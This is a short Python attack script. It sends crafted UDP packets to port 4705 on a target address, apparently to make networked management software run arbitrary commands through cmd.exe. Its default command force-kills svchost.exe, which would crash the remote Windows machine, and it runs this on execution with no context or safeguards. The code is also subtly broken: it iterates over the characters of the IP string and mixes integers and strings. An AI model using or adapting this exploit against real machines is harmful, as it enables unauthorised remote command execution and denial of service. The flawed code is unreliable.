import socket
import binascii
import os
import subprocess
import threading
import random
import string
import time
import logging

def send_cmd(txt='taskkill /f /IM svchost.exe',TargetIP="192.168.65.75",Port=4705):
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for ip in TargetIP:
        txt_hex = ''
        for i in range(len(txt)):
            if i == ' ':
                txt_hex += 20
            txt_hex = txt_hex + hex(ord(txt[i]))[2:] + "00"
        payload = f'444d4f43000001006e030000{random.randint(11, 99)}44dcfa94cc8a4ba5fffa49b0caa95f204e0000c0a81484610300006103000000020000000000000f0000000100000043003a005c00570069006e0064006f00770073005c00730079007300740065006d00330032005c0063006d0064002e0065007800650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002f006b002000{txt_hex}00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000'
        payload_bytes = bytes.fromhex(payload)
        udp_socket.sendto(payload_bytes, (f"{ip}", Port))
    udp_socket.close()

send_cmd()
print("good")
